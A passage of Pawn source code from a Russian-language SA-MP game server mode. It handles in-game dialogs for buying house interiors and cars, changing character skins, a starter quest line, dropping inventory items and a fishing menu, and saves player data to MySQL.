				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 8;
				HouseInfo[house][hExitx] = 2807.6147;
				HouseInfo[house][hExity] = -1173.7506;
				HouseInfo[house][hExitz] = 1025.5703;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 88:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 2;
				HouseInfo[house][hExitx] = 2237.5376;
				HouseInfo[house][hExity]= -1080.5271;
				HouseInfo[house][hExitz] = 1049.0234;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 89:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 8;
				HouseInfo[house][hExitx] = 2365.1992;
				HouseInfo[house][hExity] = -1134.6941;
				HouseInfo[house][hExitz] = 1050.8750;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 91:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 2;
				HouseInfo[house][hExitx] = 267.4610;
				HouseInfo[house][hExity]= 304.9829;
				HouseInfo[house][hExitz] = 999.1484;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 92:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 10;
				HouseInfo[house][hExitx] = 421.5309;
				HouseInfo[house][hExity]= 2536.5486;
				HouseInfo[house][hExitz] = 10.0000;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 93:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 5;
				HouseInfo[house][hExitx] = 2233.6919;
				HouseInfo[house][hExity]= -1112.8107;
				HouseInfo[house][hExitz] = 1050.8828;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 94:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 10;
				HouseInfo[house][hExitx] = 421.7613;
				HouseInfo[house][hExity]= 2536.4836;
				HouseInfo[house][hExitz] = 10.0000;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 95:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 4;
				HouseInfo[house][hExitx] = 221.6766;
				HouseInfo[house][hExity]= 1142.4962;
				HouseInfo[house][hExitz] = 1082.6094;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 96:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 1;
				HouseInfo[house][hExitx] = 2217.9087;
				HouseInfo[house][hExity]= -1076.3169;
				HouseInfo[house][hExitz] = 1050.4844;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 97:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 100000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 2;
				HouseInfo[house][hExitx] = 2467.8691;
				HouseInfo[house][hExity]= -1698.3516;
				HouseInfo[house][hExitz] = 1013.5078;
				PlayerInfo[playerid][pBank] -=100000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 50:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
        }
    case 50+1:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 0 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+1, DIALOG_STYLE_LIST, "Меню", "[0] [skin:79]\n[1] [skin:78]\n[2] [skin:137]\n[3] [skin:200]\n[4] [skin:230]\n[5] [skin:239]\n[6] [skin:212]\n[7] [skin:228]\n[8] [skin:142]\n[9] [skin:297]\n[10] [skin:292]\n[11] [skin:122]\n[12] [skin:193]\n[13] [skin:55]\n[14] [skin:90]\n[15] [skin:40]\n[16] [skin:233]\n[17] [skin:298]\n[18] [skin:93]", "Выбрать", "Назад");
        }
    case 50+2:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 1 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+2, DIALOG_STYLE_LIST, "Меню", "[0] [skin:280]\n[1] [skin:281]\n[2] [skin:282]\n[3] [skin:283]\n[4] [skin:288]\n[5] [skin:284]\n[6] [skin:285]\n[7] [skin:76]\n[8] [skin:306]\n[9] [skin:307]\n[10] [skin:309]\n[11] [skin:265]\n[12] [skin:266]\n[13] [skin:267]\n[14] [skin:310]\n[15] [skin:311]\n[16] [skin:302]\n[17] [skin:303]\n[18] [skin:304]\n[19] [skin:305]", "Выбрать", "Назад");
        }
    case 50+3:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 2 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+3, DIALOG_STYLE_LIST, "Меню", "[0] [skin:287]\n[1] [skin:191]\n[2] [skin:179]", "Выбрать", "Назад");
        }
    case 50+4:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 3 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+4, DIALOG_STYLE_LIST, "Меню", "[0] [skin:274]\n[1] [skin:275]\n[2] [skin:276]\n[3] [skin:70]\n[4] [skin:219]\n[5] [skin:308]", "Выбрать", "Назад");
        }
    case 50+5:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 4 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+5, DIALOG_STYLE_LIST, "Меню", "[0] [skin:57]\n[1] [skin:98]\n[2] [skin:147]\n[3] [skin:187]\n[4] [skin:216]", "Выбрать", "Назад");
        }
    case 50+6:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 5 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+6, DIALOG_STYLE_LIST, "Меню", "[0] [skin:59]\n[1] [skin:240]\n[2] [skin:150]", "Выбрать", "Назад");
        }
    case 50+7:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 6 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+7, DIALOG_STYLE_LIST, "Меню", "[0] [skin:188]\n[1] [skin:217]\n[2] [skin:250]\n[3] [skin:261]\n[4] [skin:148]\n[5] [skin:211]", "Выбрать", "Назад");
        }
    case 50+8:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 7 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+8, DIALOG_STYLE_LIST, "Меню", "[0] [skin:124]\n[1] [skin:223]\n[2] [skin:113]\n[3] [skin:91]", "Выбрать", "Назад");
        }
    case 50+9:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 8 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+9, DIALOG_STYLE_LIST, "Меню", "[0] [skin:123]\n[1] [skin:186]\n[2] [skin:120]\n[3] [skin:169]\n[4] [skin:117]\n[5] [skin:118]", "Выбрать", "Назад");
        }
    case 50+10:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 9 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+10, DIALOG_STYLE_LIST, "Меню", "[0] [skin:272]\n[1] [skin:112]\n[2] [skin:125]\n[3] [skin:214]\n[4] [skin:111]", "Выбрать", "Назад");
        }
    case 50+11:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 10 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+11, DIALOG_STYLE_LIST, "Меню", "[0] [skin:175]\n[1] [skin:174]\n[2] [skin:173]\n[3] [skin:226]", "Выбрать", "Назад");
        }
    case 50+12:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 11 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+12, DIALOG_STYLE_LIST, "Меню", "[0] [skin:105]\n[1] [skin:106]\n[2] [skin:107]\n[3] [skin:269]\n[4] [skin:271]\n[5] [skin:270]\n[6] [skin:56]", "Выбрать", "Назад");
        }
    case 50+13:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 12 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+13, DIALOG_STYLE_LIST, "Меню", "[0] [skin:102]\n[1] [skin:103]\n[2] [skin:104]\n[3] [skin:195]", "Выбрать", "Назад");
        }
    case 50+17:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 13 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+17, DIALOG_STYLE_LIST, "Меню", "[0] [skin:108]\n[1] [skin:109]\n[2] [skin:110]\n[3] [skin:190]", "Выбрать", "Назад");
        }
    case 50+15:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 14 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+17, DIALOG_STYLE_LIST, "Меню", "[0] [skin:114]\n[1] [skin:116]\n[2] [skin:115]\n[3] [skin:41]", "Выбрать", "Назад");
        }
    case 50+16:
        {
            if(!response) return true;
            format(string, sizeof(string), "/spy %i on 15 %i", GetPVarInt(playerid, "SmenaSkina"), listitem);
            CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
            return ShowPlayerDialogEx(playerid, 50+16, DIALOG_STYLE_LIST, "Меню", "[0] [skin:100]\n[1] [skin:247]\n[2] [skin:248]\n[3] [skin:254]\n[4] [skin:246]\n[5] [skin:64]\n[6] [skin:131]\n[7] [skin:198]\n[8] [skin:181]", "Выбрать", "Назад");
        }
		//AutoSalon
	case 14009:
		{
			new x;
			switch(GetPVarInt(playerid,"AutoShop"))
			{
			case 3,4: x = 2;
			}
			if(response) SetPVarInt(playerid,"CarShop",x+1);
			else SetPVarInt(playerid,"CarShop",x+2);
			ShowBuyCar(playerid);
		}
	case 14010:
		{
		    if(!response) return true;
		    SetPVarInt(playerid, "chosencar_s", listitem);
		    format(string, sizeof(string), "\n\n{FFFFFF}Вы действительно хотите заменить ваше авто {FFFF00}%s {FFFFFF} на новое {FFFF00}%s\n\n",
					VehicleNames[CarInfo[playerid][carModel][listitem]-400], VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400]);
			ShowPlayerDialogEx(playerid, 14012, 0, "Предупреждение", string, "Купить", "Отмена");
		}
	case 14012:
	    {
	        if(!response)
			{
		        new strs[128];
			    for(new i = 0; i < 5; i++)
			    {
			        new str[32];
			        format(str, sizeof(str), "%i %s\n", i, VehicleNames[CarInfo[playerid][carModel][i]-400]);
			        strcat(strs, str, sizeof(strs));
			    }
				return ShowPlayerDialogEx(playerid,14010,DIALOG_STYLE_LIST,"Замена авто",strs,"Купить","Отмена");
		    }
			new h = GetPVarInt(playerid,"chosencar_s");
			if(h == -1) h = 0;
			if(PlayerInfo[playerid][pBank] < ShopCar[GetPVarInt(playerid, "SelectAvto")][1]) return SCM(playerid,-1," На вашем банковском счету недостаточно денег!");
			CarInfo[playerid][carModel][h] = ShopCar[GetPVarInt(playerid, "SelectAvto")][0];
			CarInfo[playerid][carColor_one][h] = GetPVarInt(playerid,"BuyColor");
			CarInfo[playerid][carColor_two][h] = GetPVarInt(playerid,"BuyColor1");
			if(booston == 0)
			{
			    PlayerInfo[playerid][pBank] -= ShopCar[GetPVarInt(playerid, "SelectAvto")][1];
				format(YCMDstr, sizeof(YCMDstr), "~r~-$%i",ShopCar[GetPVarInt(playerid, "SelectAvto")][1]);
			}
			if(booston == 1)
			{
			   PlayerInfo[playerid][pBank] -= ShopCar[GetPVarInt(playerid, "SelectAvto")][1]-ShopCar[GetPVarInt(playerid, "SelectAvto")][1]*20/100;
			   format(YCMDstr, sizeof(YCMDstr), "~r~-$%i",ShopCar[GetPVarInt(playerid, "SelectAvto")][1]-ShopCar[GetPVarInt(playerid, "SelectAvto")][1]*20/100);
			}
			GameTextForPlayer(playerid, YCMDstr, 2000, 1);
			CarInfo[playerid][carPercent][h] = 100;
			CarInfo[playerid][carFuel][h] = 200;
			ExitCar(playerid);
			AutoSaloon[playerid] = false;
			format(string, 70, "");
			SCM(playerid,COLOR_GREEN, " Вы приобрели автомобиль. Вам нужно подождать 24 часа/либо (( /fixcar )) заплатить");
			ClearCarsPlayer(playerid);
            LoadCarsPlayer(playerid);
			if(GetPVarInt(playerid, "chosencar") == -1) SetPVarInt(playerid, "chosencar", h);
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_CARS"` SET model = '%i', color_one = '%i', color_two = '%i', percent = '%i', fuel = '%f' WHERE id = '%i' AND owner = '%s'", CarInfo[playerid][carModel][h], CarInfo[playerid][carColor_one][h], CarInfo[playerid][carColor_two][h], CarInfo[playerid][carPercent][h], CarInfo[playerid][carFuel][h], h, PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
	    }
	case 14011:
		{
			if(response) ExitCar(playerid);
		}
	case 11228:
		{
			if(!response) return true;
			PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
			ShowPlayerDialogEx(playerid,11229,DIALOG_STYLE_MSGBOX,"Задание","Привет. Для начала я представлюсь. Меня зовут Вито, и я помогу тебе освоиться в этом городе и найти работу.\n\
			В порту требуются грузчики - это отличный способ заработать для сдачи на водительские права.\n\
			Если справишься с задачей, то через некоторое время я напишу тебе снова.\n\
			У меня будут дела посложнее, но и награда будет соответствующая\n\
			{DDCD70}Задача: Перетащить 20 мешков\n\
			{17B757}Награда: 500 вирт"
			,"Готово","");
			SCM(playerid,COLOR_YELLOW," Используйте команду /quest, чтобы повторно посмотреть текущий квест");
			SCM(playerid,0x30a0a7aa," Задание выполнено");
			PlayerInfo[playerid][pQuestL] = 1;
			PlayerInfo[playerid][pQuest] = 1;
			PlayerInfo[playerid][pQuestP] = 0;
			PlayerInfo[playerid][pQuestF] = 5;
			PlayerInfo[playerid][pQuestPF] = 1;
			PlayerInfo[playerid][pQuestShow] = 1;
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pQuestL = '%i', pQuest = '%i', pQuestP = '%i', pQuestF = '%i', pQuestPF = '%i', pQuestShow = '%i' WHERE name = '%e'",
			PlayerInfo[playerid][pQuestL], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestF], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pQuestShow], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 1426:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pDrugs] < 1) return SCM(playerid,COLOR_GREY," У вас нет наркотиков!");
					if(SLOTVIBROS >= 900) return SCM(playerid,COLOR_GREY, " В данный момент нельзя выбросить что либо");
					new Float:Xw,Float:Yw,Float:Zw;
					VibrosInfo[SLOTVIBROS][vModel] = 1;
					VibrosInfo[SLOTVIBROS][vTime] = GetTickCount();
					GetPlayerPos(playerid,Xw,Yw,Zw);
					VibrosInfo[SLOTVIBROS][vX] = Xw;
					VibrosInfo[SLOTVIBROS][vY] = Yw;
					VibrosInfo[SLOTVIBROS][vZ] = Zw-0.9;
					VibrosInfo[SLOTVIBROS][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[SLOTVIBROS][vX], VibrosInfo[SLOTVIBROS][vY], VibrosInfo[SLOTVIBROS][vZ], 10.0);
					VibrosInfo[SLOTVIBROS][vKol] = PlayerInfo[playerid][pDrugs];
					VibrosInfo[SLOTVIBROS][vObject] = CreateObject(1485,VibrosInfo[SLOTVIBROS][vX],VibrosInfo[SLOTVIBROS][vY],VibrosInfo[SLOTVIBROS][vZ],0.00,0.00,0.00);
					SCM(playerid,COLOR_GREY," Вы выбросили наркотики на землю!");
					PlayerInfo[playerid][pDrugs] = 0;
					SLOTVIBROS++;
				}
			case 1:
				{
					if(PlayerInfo[playerid][pMats] < 1) return SCM(playerid,COLOR_GREY," У вас нет материалов!");
					if(SLOTVIBROS >= 900) return SCM(playerid,COLOR_GREY," В данный момент нельзя выбросить что либо");
					new Float:Xw,Float:Yw,Float:Zw;
					VibrosInfo[SLOTVIBROS][vModel] = 2;
					VibrosInfo[SLOTVIBROS][vTime] = GetTickCount();
					GetPlayerPos(playerid,Xw,Yw,Zw);
					VibrosInfo[SLOTVIBROS][vX] = Xw;
					VibrosInfo[SLOTVIBROS][vY] = Yw;
					VibrosInfo[SLOTVIBROS][vZ] = Zw-0.9;
					VibrosInfo[SLOTVIBROS][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[SLOTVIBROS][vX], VibrosInfo[SLOTVIBROS][vY], VibrosInfo[SLOTVIBROS][vZ], 10.0);
					VibrosInfo[SLOTVIBROS][vKol] = PlayerInfo[playerid][pMats];
					VibrosInfo[SLOTVIBROS][vObject] = CreateObject(1210,VibrosInfo[SLOTVIBROS][vX],VibrosInfo[SLOTVIBROS][vY],VibrosInfo[SLOTVIBROS][vZ],90.00,0.00,0.00);
					SCM(playerid,COLOR_GREY," Вы выбросили материалы на землю!");
					PlayerInfo[playerid][pMats] = 0;
					SLOTVIBROS++;
				}
			}
		}
	case 1343:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					switch(PlayerInfo[playerid][pQuestL])
					{
					case 0: SCM(playerid,COLOR_GREY," Сюжетная линия гость уже пройдена");
					case 1:
						{
							if(PlayerInfo[playerid][pQuest] == 1)
							{
								ShowPlayerDialogEx(playerid,11229,DIALOG_STYLE_MSGBOX,"Задание","Привет. Для начала я представлюсь. Меня зовут Вито, и я помогу тебе освоиться в этом городе и найти работу.\n\
								В порту требуются грузчики - это отличный способ заработать для сдачи на водительские права.\n\
								Если справишься с задачей, то через некоторое время я напишу тебе снова.\n\
								У меня будут дела посложнее, но и награда будет соответствующая\n\
								{DDCD70}Задача: Перетащить 20 мешков\n\
								{17B757}Награда: 500 вирт"
								,"Готово","");
							}
							else if(PlayerInfo[playerid][pQuest] == 2) {	ShowPlayerDialogEx(playerid,11230,DIALOG_STYLE_MSGBOX,"Задание","Это снова Вито,вижу тебе нужны права.\nУ меня есть знакомые в Автошколе,они помогут тебе сдать совершенно бесплатно.\nЧтобы добраться до Автошколы,воспользуйся Автобусом или Такси.\n{DDCD70}Задача: Пройдите автосдачу на права(Не покупкая права у инструктора!)\n{17B757}Награда: Бесплатная сдача на права"
								,"Готово",""); }
							else if(PlayerInfo[playerid][pQuest] == 3) {	ShowPlayerDialogEx(playerid,13372,DIALOG_STYLE_MSGBOX,"Задание","Тут неподалёку есть ферма,где можно неплохо заработать.\nМожешь использовать gps или найти таксиста и попросить его отвезти тебя.\nЕсли ты сможешь за раз собрать 30 кустов урожая,то я поделюсь с тобой своей прибылью\n{DDCD70}Задача: Собрать 30 единиц урожая\n{17B757}Награда: 2000 вирт"
								,"Готово",""); }
							else if(PlayerInfo[playerid][pQuest] == 4) {	ShowPlayerDialogEx(playerid,13374,DIALOG_STYLE_MSGBOX,"Задание","Теперь у тебя есть права и деньги.Пора бы приодеться\nВ каждом городе есть магазин одежды.Доедь до него,и купи что-нибудь приличное.\nИ не забывай использовать gps\n{DDCD70}Задача: Купить любой скин\n{17B757}Награда: 1000 вирт"
								,"Готово",""); }
							else if(PlayerInfo[playerid][pQuest] == 5) {	ShowPlayerDialogEx(playerid,13375,DIALOG_STYLE_MSGBOX,"Задание","Теперь ты можешь поехать в Мэрию и получить там паспорт\n{DDCD70}Задача: Войти в мэрию\n{17B757}Награда: 2 уровень,4000 вирт"
								,"Готово",""); }
						}
					}
				}
			case 1: SCM(playerid,COLOR_GREY," Временно не доступно");
			case 2: QuestStats(playerid,playerid);
			case 3: ShowPlayerDialogEx(playerid, 1443, DIALOG_STYLE_INPUT, "Ввод ид","Введите ID игрока,\nчью статистику вы хотите посмотреть.\nИгрок должен быть онлайн!","Далее","Назад");
			}
		}
	case 1443:
		{
			if(!response) return ShowPlayerDialogEx(playerid,1343,DIALOG_STYLE_LIST, "Управление квестами","Текущий квест\nВыбор сюжетной линии [Временно не работает]\nСтатистика\nЧужая статистика", "Далее", "Выход");
			if(IsPlayerConnected(strval(inputtext))) { QuestStats(playerid,strval(inputtext));}
			else SCM(playerid,COLOR_GREY," Игрок не найден"),ShowPlayerDialogEx(playerid, 1443, DIALOG_STYLE_INPUT, "Ввод ид","Введите ID игрока,\nчью статистику вы хотите посмотреть.\nИгрок должен быть онлайн!","Далее","Назад");
		}
	case 1342:
		{
			if(!response) return true;
			//ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nИнформация\nПомощь", "Выбор", "Выход");
			switch(listitem)
			{
			case 0:
				{
					if(!IsAtFishPlace(playerid)) return SCM(playerid,0x81DA99AA," Вы должны находиться возле причала");
					if(!GetPVarInt(playerid,"fish_began"))
					{
